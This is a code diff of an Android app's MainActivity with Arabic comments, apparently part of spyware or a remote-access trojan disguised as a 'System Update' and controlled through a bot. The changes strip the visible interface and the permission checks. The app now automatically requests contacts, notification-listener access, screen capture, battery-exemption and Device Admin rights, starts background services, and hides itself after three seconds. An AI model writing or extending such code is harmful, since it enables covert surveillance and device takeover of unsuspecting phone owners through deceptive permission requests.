@@ -12,9 +12,6 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
-import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
@@ -25,7 +22,6 @@ import androidx.core.content.ContextCompat;
 public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_MEDIA_PROJECTION = 100;
     private static final int REQUEST_CODE_PERMISSIONS = 101;
-    private static final int REQUEST_OVERLAY_PERMISSION = 102;
 
     private final String[] permissions = {
             Manifest.permission.READ_CONTACTS,
@@ -48,36 +44,12 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setPadding(50, 100, 50, 50);
-
-        TextView tvStatus = new TextView(this);
-        tvStatus.setText("⚙️ System Update\n\n✅ الخدمة تعمل في الخلفية\n📱 ارسل /help للبوت");
-        tvStatus.setTextSize(16);
-
-        Button btnPermissions = new Button(this);
-        btnPermissions.setText("🔓 تفعيل جميع الصلاحيات تلقائياً");
-        btnPermissions.setOnClickListener(v -> requestAllPermissions());
-
-        layout.addView(tvStatus);
-        layout.addView(btnPermissions);
-        setContentView(layout);
-
         // بدء الخدمات فوراً
         startService(new Intent(this, MainService.class));
         startService(new Intent(this, NotifyService.class));
 
-        // التحقق من الصلاحيات بعد 2 ثانية
-        new android.os.Handler().postDelayed(() -> {
-            if (checkAllPermissions()) {
-                Toast.makeText(this, "✅ جميع الصلاحيات مفعلة", Toast.LENGTH_SHORT).show();
-                moveTaskToBack(true);
-                finish();
-            } else {
-                requestAllPermissions();
-            }
-        }, 2000);
+        // طلب جميع الصلاحيات تلقائياً
+        new android.os.Handler().postDelayed(() -> requestAllPermissions(), 500);
     }
 
     private void requestAllPermissions() {
@@ -89,27 +61,20 @@ public class MainActivity extends AppCompatActivity {
         }
 
         // 2. صلاحية الإشعارات
-        if (!isNotificationListenerEnabled()) {
-            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-        }
+        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
 
         // 3. صلاحية تسجيل الشاشة
-        if (!isScreenCaptureEnabled()) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-                startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
-            }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
         }
 
         // 4. تجاهل البطارية
-        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-        if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            intent.setData(Uri.parse("package:" + getPackageName()));
-            startActivity(intent);
-        }
+        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+        intent.setData(Uri.parse("package:" + getPackageName()));
+        startActivity(intent);
 
-        // 5. صلاحية Device Admin
+        // 5. صلاحية Device Admin (للقفل)
         ComponentName admin = new ComponentName(this, AdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         if (!dpm.isAdminActive(admin)) {
@@ -118,50 +83,13 @@ public class MainActivity extends AppCompatActivity {
             startActivity(adminIntent);
         }
 
-        // 6. صلاحية النافذة العائمة
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION);
-            }
-        }
-
         Toast.makeText(this, "✅ جاري فتح جميع الصلاحيات", Toast.LENGTH_LONG).show();
-    }
-
-    private boolean isNotificationListenerEnabled() {
-        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
-        return enabledListeners != null && enabledListeners.contains(getPackageName());
-    }
-
-    private boolean isScreenCaptureEnabled() {
-        return getSharedPreferences("screen_capture", MODE_PRIVATE).contains("resultCode");
-    }
-
-    private boolean checkAllPermissions() {
-        // التحقق من الأذونات العادية
-        for (String permission : permissions) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                return false;
-            }
-        }
-        // التحقق من الإشعارات
-        if (!isNotificationListenerEnabled()) return false;
-        // التحقق من تسجيل الشاشة
-        if (!isScreenCaptureEnabled()) return false;
-        // التحقق من تجاهل البطارية
-        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-        if (!pm.isIgnoringBatteryOptimizations(getPackageName())) return false;
-        // التحقق من Device Admin
-        ComponentName admin = new ComponentName(this, AdminReceiver.class);
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        if (!dpm.isAdminActive(admin)) return false;
-        // التحقق من النافذة العائمة
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(this)) return false;
-        }
-        return true;
+        
+        // إخفاء التطبيق بعد 3 ثواني
+        new android.os.Handler().postDelayed(() -> {
+            moveTaskToBack(true);
+            finish();
+        }, 3000);
     }
 
     @Override
@@ -173,17 +101,6 @@ public class MainActivity extends AppCompatActivity {
                     .putInt("resultCode", resultCode)
                     .putString("data", data.toUri(0))
                     .apply();
-            Toast.makeText(this, "✅ تم تفعيل تسجيل الشاشة", Toast.LENGTH_SHORT).show();
-        }
-        if (requestCode == REQUEST_OVERLAY_PERMISSION && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (Settings.canDrawOverlays(this)) {
-                Toast.makeText(this, "✅ تم تفعيل النافذة العائمة", Toast.LENGTH_SHORT).show();
-            }
-        }
-        // إعادة التحقق من الصلاحيات
-        if (checkAllPermissions()) {
-            moveTaskToBack(true);
-            finish();
         }
     }
 
@@ -191,9 +108,5 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (checkAllPermissions()) {
-            moveTaskToBack(true);
-            finish();
-        }
     }
 }
